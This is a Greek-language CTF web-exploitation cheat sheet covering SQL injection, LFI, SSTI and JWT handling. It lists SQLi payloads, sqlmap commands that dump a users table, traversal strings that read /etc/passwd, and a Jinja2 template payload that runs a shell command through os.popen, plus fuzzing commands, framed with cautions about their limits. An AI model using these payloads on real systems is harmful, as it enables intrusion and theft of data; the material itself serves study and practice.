## Πριν ξεκινήσετε

Στις ασκήσεις **Web** εξετάζουμε πώς μια εφαρμογή χειρίζεται αιτήματα, παραμέτρους, συνεδρίες και αρχεία. Το **SQLi** είναι έγχυση δεδομένων που μεταβάλλουν ένα ερώτημα SQL, το **XSS** εκτέλεση μη έμπιστου κώδικα στον browser, το **LFI** προβληματική ενσωμάτωση τοπικού αρχείου και το **SSTI** αξιολόγηση μη έμπιστης εισόδου από μηχανισμό προτύπων του server.

Η **ταυτοποίηση (authentication)** ελέγχει ποιος συνδέεται. Ένα **cookie** είναι δεδομένο που αποθηκεύει και επιστρέφει ο browser στο κατάλληλο πλαίσιο, ενώ το **JWT** είναι μορφή token με συγκεκριμένη δομή. Η ανάγνωση ενός token δεν αποδεικνύει ότι είναι έγκυρο ούτε ότι μπορούμε να αλλάξουμε τα δικαιώματά του.

Τα payloads είναι δοκιμαστικά παραδείγματα και δεν λειτουργούν σε κάθε εφαρμογή. Η κατάλληλη σύνταξη εξαρτάται από τη βάση δεδομένων, τον μηχανισμό προτύπων, το σημείο εισαγωγής και τα μέτρα προστασίας. Τα http://url, dbname, users και wordlist.txt είναι ενδεικτικές τιμές. Καταγράψτε το αίτημα και την πραγματική απόκριση πριν βγάλετε συμπέρασμα.

## 💉 Έγχυση SQL (SQL Injection)

### Βασικά δοκιμαστικά payloads
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

## 📁 LFI — Ενσωμάτωση τοπικών αρχείων

Τα παραδείγματα περιλαμβάνουν traversal, κωδικοποιήσεις και ειδικές συμπεριφορές παλαιότερων περιβαλλόντων. Το τελικό %00, για παράδειγμα, δεν αποτελεί γενική παράκαμψη σύγχρονων ελέγχων.


```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

## 🔧 SSTI — Έγχυση εκφράσεων σε πρότυπα του server

### Ενδείξεις εντοπισμού
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Παράδειγμα εκτέλεσης εντολής μέσω Jinja2

Το απόσπασμα είναι έκφραση προτύπου Jinja2, παρότι το πρωτότυπο επισημαίνει το μπλοκ ως Python. Προϋποθέτει συγκεκριμένα διαθέσιμα αντικείμενα και μη περιορισμένο πλαίσιο αξιολόγησης· δεν είναι αυτοτελές Python script.

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## 🍪 Cookies και JSON Web Tokens (JWT)

Το eyJ... είναι ελλιπές ενδεικτικό κείμενο. Η απλή εφαρμογή base64 -d σε ολόκληρο token δεν είναι γενικός αποκωδικοποιητής JWT. Τα σχετικά τμήματα χρησιμοποιούν base64url και η αποκωδικοποίηση δεν επαληθεύει την υπογραφή· δείτε το [RFC 7519 για JWT](https://www.rfc-editor.org/rfc/rfc7519). Η γραμμή jwt.io (online) δηλώνει ιστότοπο και δεν είναι εντολή shell.


```bash
# Ενδεικτική απόπειρα αποκωδικοποίησης — δείτε τους περιορισμούς
echo "eyJ..." | base64 -d

# Εργαλεία
jwt_tool.py token
jwt.io (online)
```

## 🛠️ Χρήσιμα εργαλεία

```bash
# Αναζήτηση πιθανών καταλόγων από λίστα
gobuster dir -u http://url -w wordlist.txt

# Δοκιμή πολλών τιμών εισόδου (fuzzing)
ffuf -u http://url/FUZZ -w wordlist.txt

# Εντοπισμός πιθανών παραμέτρων
arjun -u http://url
```
